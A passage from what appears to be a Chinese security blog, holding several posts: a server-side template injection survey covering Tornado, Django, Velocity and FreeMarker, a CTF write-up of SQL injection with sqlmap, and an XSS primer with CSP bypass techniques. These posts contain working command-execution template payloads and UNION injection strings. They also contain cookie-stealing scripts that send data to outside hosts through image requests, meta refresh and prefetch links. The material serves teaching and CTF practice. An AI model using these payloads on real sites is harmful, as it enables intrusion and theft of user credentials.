self.get_argument(&#x27;name&#x27;, &#x27;&#x27;)        template_data = TEMPLATE.replace(&quot;FOO&quot;,name)        t = tornado.template.Template(template_data)        self.write(t.generate(name=name))application = tornado.web.Application([(r&quot;/&quot;, MainHandler),], debug=True, static_path=None, template_path=None)if __name__ == &#x27;__main__&#x27;:    application.listen(8000)    tornado.ioloop.IOLoop.instance().start()\n\n这里拿一道BUUCTF的题来演示一下tornado render模板注入：\n[护网杯 2018]easy_tornado\n\n\n根据上面的信息，我们知道flag在/fllllllllllllag文件中\nrender是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页render配合Tornado使用\n最后就是这段代码md5(cookie_secret+md5(filename))，再来分析我们访问的链接：\nhttp://313ac7f3-c560-4d46-b1ff-daa279729980.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=27eda9bc17cbe1b856e6d541e10c16ea\n推测md5加密过后的值就是url中filehash对应的值，想获得flag只要我们在filename中传入/fllllllllllllag文件和filehash，所以关键是获取cookie_secret\n在tornado模板中，存在一些可以访问的快速对象，比如 &#123;&#123;escape(handler.settings[&quot;cookie&quot;])&#125;&#125;，这个其实就是handler.settings对象，里面存储着一些环境变量。\n具体分析请参照《python SSTI tornado render模板注入》。\n观察错误页面，发现页面返回的由msg的值决定\n\n修改msg的值注入，获得环境变量\n\ncookie_secret: faaff564-f1dd-429d-90b3-130ab49962ea\n得到cookie_secret的值，根据上面的md5进行算法重构，就可以得到filehash，这里给出py3的转换脚本\nimport hashlibhash = hashlib.md5()filename=&#x27;/fllllllllllllag&#x27;cookie_secret=&quot;faaff564-f1dd-429d-90b3-130ab49962ea&quot;hash.update(filename.encode(&#x27;utf-8&#x27;))s1=hash.hexdigest()hash = hashlib.md5()hash.update((cookie_secret+s1).encode(&#x27;utf-8&#x27;))print(hash.hexdigest())\n得到filehash=874955327dac355296226eb28f1b02b8，得到flag\n\n九、Python-Django模板\n先看存在漏洞的代码：\ndef view(request, *args, **kwargs):    template = &#x27;Hello &#123;user&#125;, This is your email: &#x27; + request.GET.get(&#x27;email&#x27;)    return HttpResponse(template.format(user=request.user))\n很明显 email 就是注入点，但是条件被限制的很死，很难执行命令，现在拿到的只有有一个和user有关的变量request.user ，这个时候我们就应该在没有应用源码的情况下去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用。\n后来发现Django自带的应用 “admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：\n\n所以可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。\npayload如下：\nhttp://localhost:8000/?email=&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;http://localhost:8000/?email=&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;\n十、Java-velocity模板\n（以下板块参照自《CVE-2019-3396 Confluence Velocity SSTI漏洞浅析》）\nApache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。\n1. 基本语法\n语句标识符\n#用来标识Velocity的脚本语句，包括#set、#if 、#else、#end、#foreach、#end、#include、#parse、#macro等语句。\n变量\n$用来标识一个变量，比如模板文件中为Hello $a，可以获取通过上下文传递的$a\n声明\nset用于声明Velocity脚本变量，变量可以在脚本中声明\n#set($a =&quot;velocity&quot;)#set($b=1)#set($arrayName=[&quot;1&quot;,&quot;2&quot;])\n注释\n单行注释为##，多行注释为成对出现的#* … *#\n条件语句\n以if/else为例：\n#if($foo&lt;10)    &lt;strong&gt;1&lt;/strong&gt;#elseif($foo==10)    &lt;strong&gt;2&lt;/strong&gt;#elseif($bar==6)    &lt;strong&gt;3&lt;/strong&gt;#else    &lt;strong&gt;4&lt;/strong&gt;#end\n转义字符\n如果$a已经被定义，但是又需要原样输出$a，可以试用\\转义作为关键的$\n基础使用\n使用Velocity主要流程为：\n\n初始化Velocity模板引擎，包括模板路径、加载类型等\n创建用于存储预传递到模板文件的数据的上下文\n选择具体的模板文件，传递数据完成渲染\n\nVelocityTest.java\npackage Velocity;import org.apache.velocity.Template;import org.apache.velocity.VelocityContext;import org.apache.velocity.app.VelocityEngine;import java.io.StringWriter;public class VelocityTest &#123;    public static void main(String[] args) &#123;        VelocityEngine velocityEngine = new VelocityEngine();        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, &quot;file&quot;);        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, &quot;src/main/resources&quot;);        velocityEngine.init();        VelocityContext context = new VelocityContext();        context.put(&quot;name&quot;, &quot;Rai4over&quot;);        context.put(&quot;project&quot;, &quot;Velocity&quot;);        Template template = velocityEngine.getTemplate(&quot;test.vm&quot;);        StringWriter sw = new StringWriter();        template.merge(context, sw);        System.out.println(&quot;final output:&quot; + sw);    &#125;&#125;\n模板文件：src/main/resources/test.vm\nHello World! The first velocity demo.Name is $name.Project is $project\n输出结果：\nfinal output:Hello World! The first velocity demo.Name is Victor Zhang.Project is Velocityjava.lang.UNIXProcess@12f40c25\n通过 VelocityEngine 创建模板引擎，接着 velocityEngine.setProperty 设置模板路径 src/main/resources、加载器类型为file，最后通过 velocityEngine.init() 完成引擎初始化。\n通过 VelocityContext() 创建上下文变量，通过put添加模板中使用的变量到上下文。\n通过 getTemplate 选择路径中具体的模板文件test.vm，创建 StringWriter 对象存储渲染结果，然后将上下文变量传入 template.merge 进行渲染。\n比如：\n这里使用java-sec-code里面的SSTI代码：\n\npoc：\nhttp://127.0.0.1:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;sleep 5&quot;).waitFor() //延迟了5秒\n\n参照《白头搔更短，SSTI惹人心！》简单进行调试\n在最初的Controller层下断点，来追踪poc的解析过程：\n\n（template -&gt; instring）进入 Velocity.evaluate 方法：\n\n（instring -&gt; reader）继续跟进 evaluate 方法，RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。\n\n跟进 StringReader 方法查看详情：\n\n（reader -&gt; nodeTree）继续跟进 this.evaluate() 方法\n\n（nodeTree -&gt; writer）继续跟进render方法\n\nemmm…继续跟进render\n\n继续看render方法\n\n跟进execute方法\n\n可以看到这是最后一步了，调试结束就可以看到poc已经成功被执行，看一下上图中的for循环的代码，大概意思是当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE\nConfluence 未授权RCE分析（CVE-2019-3396）\n根据官方文档的描述，可以看到这是由 widget Connector 这个插件造成的SSTI，利用SSTI而造成的RCE。在经过diff后，可以确定触发漏洞的关键点在于对post包中的_template字段\n具体漏洞代码调试可以参考：《Confluence未授权模板注入/代码执行(CVE-2019-3396)》\n《[Confluence 未授权RCE分析（CVE-2019-3396）](https://lucifaer.com/2019/04/16/Confluence 未授权RCE分析（CVE-2019-3396）/#0x01-漏洞概述)》\n十一、Java-FreeMarker\nFreeMarker 是一款模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。\n\nFreeMarker模板代码：\n&lt;html&gt;&lt;head&gt;  &lt;title&gt;Welcome!&lt;/title&gt;&lt;/head&gt;&lt;body&gt;　&lt;#–这是注释–&gt;  &lt;h1&gt;Welcome $&#123;user&#125;!&lt;/h1&gt;  &lt;p&gt;Our latest product:  &lt;a href=&quot;$&#123;latestProduct.url&#125;&quot;&gt;$&#123;latestProduct.name&#125;&lt;/a&gt;!&lt;/body&gt;&lt;/html&gt;\n模板文件存放在Web服务器上，就像通常存放静态HTML页面那样。当有人来访问这个页面， FreeMarker将会介入执行，然后动态转换模板，用最新的数据内容替换模板中 ${…} 的部分， 之后将结果发送到访问者的Web浏览器中。\n这个模板主要用于 java ，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象\n具体的高级内置函数定义参考《Seldom used and expert built-ins》\n\n主要的用法如下：\n&lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt;&lt;#assign word_wrapp =&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（）&gt;&lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt;&lt;#assign word_wrapp_narrow =&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（40）&gt;\n调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象 Execute\nfreemarker.template.utility 里面有个Execute类，这个类会执行它的参数，因此我们可以利用new函数新建一个Execute类，传输我们要执行的命令作为参数，从而构造远程命令执行漏洞。构造payload：\n&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125;\nfreemarker.template.utility 里面的JythonRuntime，可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。\n&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)&lt;/@value&gt;\n这里使用测试代码来大概演示一下：https://github.com/hellokoding/springboot-freemarker\n代码演示说明：https://hellokoding.com/spring-boot/freemarker/\n前端代码　　——&gt;　　hello.ftl\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Hello $&#123;name&#125;!&lt;/title&gt;    &lt;link href=&quot;/css/main.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;h2 class=&quot;hello-title&quot;&gt;Hello $&#123;name&#125;!&lt;/h2&gt;    &lt;script src=&quot;/js/main.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n后端代码　　——&gt;　　HelloController.java：\npackage com.backendvulnerabilities.ssti;import freemarker.cache.MultiTemplateLoader;import freemarker.cache.StringTemplateLoader;import freemarker.cache.TemplateLoader;import freemarker.template.Configuration;import freemarker.template.Template;import freemarker.template.TemplateException;import freemarker.template.utility.DateUtil;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.*;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.StringWriter;import java.util.HashMap;import java.util.Map;@Controllerpublic class HelloController &#123;    @Autowired    private  Configuration con;    @GetMapping(&quot;/&quot;)    public String index() &#123;        return &quot;index&quot;;    &#125;    @RequestMapping(value = &quot;/hello&quot;)    public String hello(@RequestBody Map&lt;String,Object&gt; body, Model model) &#123;        model.addAttribute(&quot;name&quot;, body.get(&quot;name&quot;));        return &quot;hello&quot;;    &#125;    @RequestMapping(value = &quot;/freemarker&quot;)    public void freemarker(@RequestParam(&quot;username&quot;) String username, HttpServletRequest httpserver,HttpServletResponse response) &#123;        try&#123;            String data = &quot;1ooooooooooooooooooo~&quot;;            String templateContent = &quot;&lt;html&gt;&lt;body&gt;Hello &quot; + username + &quot; $&#123;data&#125;&lt;/body&gt;&lt;/html&gt;&quot;;            String html = createHtmlFromString(templateContent,data);            response.getWriter().println(html);            &#125;catch (Exception e)&#123;                e.printStackTrace();            &#125;    &#125;    private String createHtmlFromString(String templateContent, String data) throws IOException, TemplateException &#123;        Configuration cfg = new Configuration();        StringTemplateLoader stringLoader = new StringTemplateLoader();        stringLoader.putTemplate(&quot;myTemplate&quot;,templateContent);        cfg.setTemplateLoader(stringLoader);        Template template = cfg.getTemplate(&quot;myTemplate&quot;,&quot;utf-8&quot;);        Map root = new HashMap();        root.put(&quot;data&quot;,data);        StringWriter writer = new StringWriter();        template.process(root,writer);        return writer.toString();    &#125;    @RequestMapping(value = &quot;/template&quot;, method =  RequestMethod.POST)    public String template(@RequestBody Map&lt;String,String&gt; templates) throws IOException &#123;        StringTemplateLoader stringLoader = new StringTemplateLoader();        for(String templateKey : templates.keySet())&#123;            stringLoader.putTemplate(templateKey, templates.get(templateKey));        &#125;        con.setTemplateLoader(new MultiTemplateLoader(new TemplateLoader[]&#123;stringLoader,            con.getTemplateLoader()&#125;));        return &quot;index&quot;;    &#125;&#125;\n上述代码主要编译给定的模板字符串和数据，生成HTML进行输出\n\n模板注入的前提是在无过滤的情况下，使用模板来解析我们输入的字符，可以通过页面上的变化，来判断我们输入的内容是否被解析，如上图我们输入的内容被成功解析到页面上，并且没有过滤。\n首先需要控制被攻击模板 /template 的内容，也就是要将本来无危害的模板文件实时更改为可攻击的模板内容。使用的payload\n&#123;&quot;hello.ftl&quot;: &quot;&lt;!DOCTYPE html&gt;&lt;html lang=\\&quot;en\\&quot;&gt;&lt;head&gt;&lt;meta charset=\\&quot;UTF-8\\&quot;&gt;&lt;#assign ex=\\&quot;freemarker.template.utility.Execute\\&quot;?new()&gt; $&#123; ex(\\&quot;ping ilxwh0.dnslog.cn\\&quot;) &#125;&lt;title&gt;Hello!&lt;/title&gt;&lt;link href=\\&quot;/css/main.css\\&quot; rel=\\&quot;stylesheet\\&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;h2 class=\\&quot;hello-title\\&quot;&gt;Hello!&lt;/h2&gt;&lt;script src=\\&quot;/js/main.js\\&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&quot;&#125;\n\n关键代码在上图的红框中，接收用户传入的参数，使用keySet()获取key值，遍历相应的模块名字，使用StringTemplateLoader来加载模板内容，并使用putTemplate将key对应的value（也就是payload）写入templateKey中。这样就可以覆盖 hello.ftl 文件的内容，具体如下：\n\n重新更改了加载的模板内容后，然后直接访问受影响的模板文件路径，此时恶意的模板文件内容就会被加载成功了，并执行了系统命令\n\ndnslog平台也受到了请求\n\n后言\n由于本篇文章篇幅过长，容易脑壳疼，所以分为上下篇，上篇大概介绍了几种语言常见的几种模板注入，下篇分析几个cms的模板注入，包括海洋cms，74cms，ofcms等\n参考：https://www.cnblogs.com/bmjoker/p/13508538.html\n十二、自动化工具\n1.手动安装，具体参考：\nhttps://github.com/Marven11/Fenjing\ngit clone https://github.com/Marven11/Fenjing\ncd Fenjing\npython -m pip install -r requirements.txt\npython -m fenjing scan --url 'http://xxx/'\n\n输入以上命令随后，cat /flag即可得到flag\n参考：https://xz.aliyun.com/t/11108  --smarty模板\n2.这里推荐自动化工具tplmap，拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利\ngithub地址：https://github.com/epinna/tplmap\n\n一键shell真香，还支持其他模板（Smarty，Mako，Tornado，Jinja2）的注入检测\n十三、漏洞防御\n\n\n和其他的注入防御一样，绝对不要让用户对传入模板的内容或者模板本身进行控制\n\n\n减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式，使用正规的模板渲染方法\n\n\n尽可能加载静态模板文件\n\n\n另一个选择是创建一个安全加固/沙箱环境，禁用或删除潜在的危险指令。\n\n\n","categories":["常见top漏洞"]},{"title":"攻防世界-NewsCenter","url":"/2023/08/06/NewsCenter/","content":"题目描述：\n无\n题目解题：\n方法一：手工注入\n这里环境出了问题，怎么刷新也显示不了，就跟着wp走一遍吧\n点进去看到如下页面\n\n毕竟已经知道是sql注入了，直接看wp分析吧：\n看到数据包最下方有个POST提交的 search =1，看到这里不知道大家想到了什么没有\n(我第一时间是想到了sql注入)\n于是我去尝试，因为search框是能输入字符的所以应该先想他为字符型注入，我比较习惯于用 order by 去判断是否有sql注入\n于是在这里构造search=1’ order by 3 --+，burp suite里发送给repeater\n\n再尝试search=1’ order by 4 --+\n\n非常好出现错误了，接下来是利用sql注入的联合查询\n search=-1’ union select 1,2,3 --+  //这里-1是为了不占用回显位\n\n判断回显位为2,3\n然后search=-1’ union select 1,version(),database() --+\n获取sql版本和当前数据库名\n\n这里为什么要获取数据库版本呢因为mysql大于5.0以上的版本有一个\n系统数据库information_schema里面的tables表和columns表包含了其他所有的表和列这样我们就可以有据查询\n并且这里知道了当前数据库为news\n然后再构造sql语句\nsearch=-1’ union select 1,version(),group_concat(table_name) from information_schema.tables where table_schema=‘news’ --+\n\n这里可以看到有两个表news，和secret_table，news应该就是页面上的那些所以我们去找flag要从secret_table表中去找\n再构造sql语句\nsearch=-1’ union select 1,version(),group_concat(column_name) from information_schema.columns where table_name=‘secret_table’ --+\n\n看到有两个列id,fl4g答案应该就在fl4g里面了\n最后的sql语句\nsearch=-1’ union select 1,version(),group_concat(fl4g) from secret_table --+\n\n方法二：sqlmap\n搜索框中填入内容，如‘1’，回车搜索抓包，将抓到包的内容保存在txt文档里\n\n使用sqlmap的-r进行注入如下，其中C:\\Users\\xxx\\Desktop\\1.txt为保存数据包的txt文件绝对路径\n#查找数据库\nsqlmap.py -r “C:\\Users\\xxx\\Desktop\\1.txt” --dbs\n#或查找当前数据库\nsqlmap.py -r “C:\\Users\\xxx\\Desktop\\1.txt” --current-dbs\n\n#查找news数据库中的表\nsqlmap.py -r “C:\\Users\\xxx\\Desktop\\1.txt” -D news --tables\n\n#查找secret_table表中的列\nsqlmap.py -r “C:\\Users\\xxx\\Desktop\\1.txt” -D news -T serect_table --columns\n\n#查找fl4g列中的字段（内容），出现flag\nsqlmap.py -r “C:\\Users\\xxx\\Desktop\\1.txt” -D news -T serect_table -C fl4g --dump\n\n怎么说，没有过滤，很新手\n参考文章：\n方法一参考\n方法二参考\n","categories":["攻防世界"]},{"title":"浅析XSS漏洞","url":"/2023/08/07/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/","content":"XSS注入总结\n一、XSS漏洞原理\nXSS，即跨站脚本攻击，是指攻击者利用Web服务器中的应用程序或代码漏洞，在页面中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码，少数情况下还有ActionScript、VBScript等语言），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行该恶意代码，从而达到攻击的目的。\n当应用程序没有对用户提交的内容进行验证和重新编码，而是直接呈现给网站的访问者时，就可能会触发XSS攻击。\n二、XSS漏洞的危害\n（1）窃取管理员帐号或Cookie。入侵者可以冒充管理员的身份登录后台，使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。\n（2）窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作。\n（3）网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马。\n（4）发送广告或者垃圾信息。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用。\n三、XSS漏洞的分类\n1、反射型XSS\n反射型XSS，也称为非持久性XSS，是最常见的一种XSS。\nXSS代码常常出现在URL请求中，当用户访问带有XSS代码的URL请求时，服务器端接收请求并处理，然后将带有XSS代码的数据返回给浏览器，浏览器解析该段带有XSS代码的数据并执行，整个过程就像一次反射，故称为反射型XSS。\n该类攻击的主要特点是它的及时性和一次性，即用户提交请求后，响应信息会立即反馈给用户。该类攻击常发生在搜索引擎、错误提示页面等对用户的输入做出直接反应的场景中。\n2、存储型XSS\n存储型XSS，也称为持久性XSS。\n在存储型XSS中，XSS代码被存储到服务器端，因此允许用户存储数据到服务器端的Web应用程序可能存在该类型XSS漏洞。攻击者提交一段XSS代码后，服务器接收并存储，当其他用户访问包含该XSS代码的页面时，XSS代码被浏览器解析并执行。\n存储型XSS攻击的特点之一是提交的恶意内容会被永久存储，因而一个单独的恶意代码就会使多个用户受害，故被称为持久性XSS，它也是跨站脚本攻击中危害最的一类。二是被存储的用户提交的恶意内容不一定被页面使用，因此存在危险的响应信息不一定被立即返回，也许在访问那些在时间上和空间上没有直接关联的页面时才会引发攻击，因此存在不确定性和更好的隐蔽性。\n这类攻击的一个典型场景是留言板、博客和论坛等，当恶意用户在某论坛页面发布含有恶意的Javascript代码的留言时，论坛会将该用户的留言内容保存在数据库或文件中并作为页面内容的一部分显示出来。当其他用户查看该恶意用户的留言时，恶意用户提交的恶意代码就会在用户浏览器中解析并执行。\n3、DOM型XSS\nDOM (Document Objet Model)指文档对象模型。\nDOM常用来表示在HTML和XML中的对象。DOM可以允许程序动态的访问和更新文档的内容、结构等。客户端JavaScript可以访问浏览器的文档对象模型。也就是说，通过JavaScript代码控制DOM节点就可以不经过服务器端的参与重构HTML页面。\n该类攻击是反射型XSS的变种。它通常是由于客户端接收到的脚本代码存在逻辑错误或者使用不当导致的。比如Javascript代码不正确地使用各种DOM方法(如document.write)和Javascript内部函数(如eval函数)，动态拼接HTML代码和脚本代码就容易引发DOM型的跨站脚本攻击。\n因此，DOM型XSS与前面两种XSS的区别就在于DOM型XSS攻击的代码不需要与服务器端进行交互，DOM型XSS的触发基于浏览器端对DOM数据的解析来完成，也就是完全是客户端的事情。\n4、判断是哪一种XSS\n发送一次带XSS代码的请求，若只能在当前返回的数据包里发现XSS代码，则是反射型；若以后这个页面的返回包里都会有XSS代码，则是存储型；若在返回包里找不到XSS代码，则是DOM型。\n四、XSS漏洞的检测与防御\n1、检测\n手工检测\n手工检测重点要考虑数据输入的地方，且需要清楚输入的数据输出到什么地方。\n在检测的开始，可以输入一些敏感字符，比如“&lt;、&gt;、（）”等，提交后查看网页源代码的变化以发现输入被输出到什么地方，且可以发现相关敏感字符是否被过滤。\n手工检测结果相对准确，但效率较低。\n工具检测\n常用工具有AVWS（Acunetix Web Vulnerability Scanner）、BurpSuite等。还有一些专门针对XSS漏洞的检测工具，如：XSSer、XSSF（跨站脚本攻击框架）、BeEF(The Browser Exploitation Framework)等。\n2、防御\n●使用黑名单进行●对HTML标签或特殊字符进行过滤●使用内容安全的CSP●使用设计上就会自动编码的框架，如：OWASP ESAPI、React JS、JSOUP等，对于JAVA而言，可以使用ESAPI.encoder().encodeForHTML()对字符串进行HTML编码。●对于反射型和存储型XSS，可以在数据返回给客户端浏览器时，将敏感字符进行转义，如：将单引号进行编码替换（十进制编码&#x27;、十六进制编码&#x27;、HTML编码&amp;apos、Unicode编码\\u0027等）。●对于DOM型XSS，可以使用上下文敏感数据编码。如：在PHP中的htmlspecialchars（）、htmlentities（）函 数可以将一些预定义的字符转换为HTML实体，如：小于转化为&lt;、大于转化为&gt;、双引号转化为&quot;、单引号转化为&amp;apos、与转化 为&amp;等。●启用浏览器的HttpOnly特性可以组织客户端脚本访问cookie。如：在PHP中可以通过下面的代码设置cookie并启用HttpOnly。\n&lt;?php    Header(&quot;Set-Cookie:password=123456;httponly&quot;,false);&gt;\n关键点：\n目标网站的目标用户\n\n浏览器\n不被预期的： 攻击者在输入时提交了可控的脚本内容，然后在输出时被浏览器解析执行\n“跨站脚本”重点是脚本：XSS在攻击时会嵌入一段远程的第三方域上的脚本资源。\n\n总之，要想尽一切办法将你的脚本内容在目标网站中目标用户的浏览器上解释执行\n1.基于存储型的XSS攻击\n上面说了这么多还是不知道xss攻击应该运用在哪些场景下，下面我们把XSS分为有CSP保护和无CSP保护两个场景来实现。\n0x01 无CSP保护下的XSS\n1.直接嵌入型\n当过滤的东西较少时，可以优先考虑这个。这种xss触发方式比较直接，直接嵌入能够xss的js代码，下面看一个例子。\n//admin访问页面&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;xss&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;var img = new Image();img.src = &#x27;http://45.78.29.252:8888/?a=&#x27;+document.cookie;document.getElementsByTagName(&quot;head&quot;)[0].appendChild(img);  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\njs代码与图片嵌入head中一起解析，之后将获取的cookie发送至xss平台\n2.import导入型\n经常用于过滤比较严格的情况，经过实验发现link的属性rel值为import时会将资源请求回来并一同解析，注意必须是完整的资源例如HTML、PHP、JS等。请求的资源必须要设置为允许跨域加载的响应头。\n&lt;!-- 无csp 远程包含js文件 --&gt;admin访问页面&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;meta charset=&quot;utf-8&quot;&gt;  &lt;title&gt;无csp/远程包含js文件/import&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;link rel=import href=http://yzbbd666.com/2.php&gt;&lt;/body&gt;&lt;/html&gt;\n下面是http://yzbbd666.com/2.php文件内容注意填写Access-Control-Allow-Origin\n&lt;?php  header(&quot;Access-Control-Allow-Origin: *&quot;);echo 1;?&gt;&lt;script src=&quot;https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;$.get(&quot;http://127.0.0.1/flag.php&quot;,function(data)&#123;//alert(data);        location.href=&quot;http://45.78.29.252:8888/?a=&quot;+escape(data);&#125;);&lt;/script&gt;\n\n我们发现访问成功了，link的import会首先将访问的资源执行所以会触发xss漏洞，将盗取的才cookie值发送至服务器\n3.script导入型\n一般也是输入限制比较多的时候，请求访问可以利用script的远程js加载。\n//admin访问页面&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;xss&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script src=http://yzbbd666.com/ld.js&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\nhttp://yzbbd666.com/ld.js内容如下，注意这里是js格式\nvar img = new Image();img.src = &#x27;http://45.78.29.252:8888/?a=&#x27;+document.cookie;document.getElementsByTagName(&quot;head&quot;)[0].appendChild(img);  \n\n说明script加载并执行了远程js脚本，并将cookie发送至xss平台\n0x02 有CSP保护下的XSS\n\nCSP中文意思是内容安全策略，为了保护文档内容而实施的策略，首先简答介绍一下CSP相关内容，其次讲解一下绕过方法。\n\n1.内容安全策略\n（1） CSP策略\n一个CSP头由多组CSP策略组成，中间由分号分隔，就像这样：\nContent-Security-Policy: default-src ‘self’ www.baidu.com; script-src ‘unsafe-inline’\n其中每一组策略包含一个策略指令和一个内容源列表\n\n（2） 常用的策略指令\ndefault-src 指令定义了那些没有被更精确指令指定的安全策略。这些指令包括：\nchild-src指定定义了 web workers 以及嵌套的浏览上下文\nconnect-src定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。\nfont-src定义了字体加载的有效来源\nimg-src定义了页面中图片和图标的有效来源\nmedia-src针对媒体引入的 HTML 多媒体的加载策略。\nobject-src插件(比如 Flash)，针对 、 或 等标签引入的 flash 等插件的加载策略。\nstyle-src定义了页面中CSS样式的有效来源\nscript-src 定义了页面中Javascript的有效来源（外部脚本）\n\n内容源\n内容源有三种：源列表、关键字和数据\n源列表\n源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。站点地址可以包含可选的通配符前缀 (星号, ‘‘)，端口号也可以使用通配符 (同样是 ‘‘) 来表明所有合法端口都是有效来源。主机通过空格分隔。\n有效的主机表达式包括：\nhttp://*.foo.com （匹配所有使用 http协议加载 foo.com 任何子域名的尝试。）\nmail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。）\nhttps://store.foo.com （匹配所有使用 https协议访问 store.foo.com 的尝试。）\n如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。\n\n关键字\n‘none’\n代表空集；即不匹配任何 URL。两侧单引号是必须的。\n‘self’\n代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。\n‘unsafe-inline’\n允许使用内联资源，如内联的script元素、javascript: URL、内联的事件处理函数和内联的style元素，两侧单引号是必须的。\n‘unsafe-eval’\n允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。\nContent-Security-Policy: default-src 'self' trustedscripts.foo.com\n\n数据\ndata:\n允许data: URI作为内容来源。\nmediastream:\n允许mediastream: URI作为内容来源。\nContent-Security-Policy: default-src 'self'; img-src 'self' data:; media-src mediastream:\n\n2.跳转\nmeta标签跳转\n\n在default-src ‘none’的情况下，可以使用meta标签实现跳转\n\n//admin访问页面&lt;?php header(&quot;Content-Security-Policy: default-src &#x27;none&#x27;;&quot;) ;//这里可以设置CSP?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;XSS&lt;/title&gt;    &lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;\n\n发现图片不能被访问，但meta标签中的内容可以被访问，成功弹至xss平台。\n小tip：如何获取cookie(1)通过document.cookie获取所有的cookie值，获取到一个cookie所有值在一起的字符串。(2)因为所有的cookie都是以分号隔开的，所有使用split(‘;’)将这个字符串切开变成数组，存起来。(3)判断数组中每一项有没有包含cookie名字的，如果有，把对应的值取出来就行。\nscript脚本跳转\n\n在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。\n\n&lt;script&gt;  window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;&lt;/script&gt;&lt;script&gt;  window.location.href=&quot;flag.php&quot;;&lt;/script&gt;\nprefetch预加载绕过\nCSP对link标签的预加载功能考虑不完善。\n在Chrome下，可以使用如下标签发送cookie\n&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;\n在Firefox下，可以将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie\n&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//[cookie].xxx.ceye.io&quot;&gt;\n\n实验代码\nadmin访问界面\n注意这里允许里内联脚本，所以理所当然的可以使用跳转的方法获取cookie的值。\n&lt;?php header(&quot;Content-Security-Policy: default-src 